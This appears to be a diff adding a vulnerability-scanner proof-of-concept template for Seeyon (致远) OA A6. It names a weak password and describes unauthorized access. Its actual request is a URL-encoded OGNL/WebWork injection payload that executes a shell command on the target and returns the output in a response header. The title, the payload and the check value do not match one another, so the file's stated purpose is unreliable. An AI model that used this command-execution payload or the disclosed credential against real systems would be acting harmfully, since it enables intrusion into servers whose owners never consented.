@@ -1,0 +1,14 @@
+﻿<DudePoc_Name>致远 OA A6 授权访问 弱口令WLCCYBD@SEEYON</DudePoc_Name>
+<DudePoc_Description>致远OA A6老版本下的未授权访问＋弱口令：WLCCYBD@SEEYON</DudePoc_Description>
+<DudePoc_SetHeader>
+GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
+Host: $<AttackHost>$
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>Sign</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
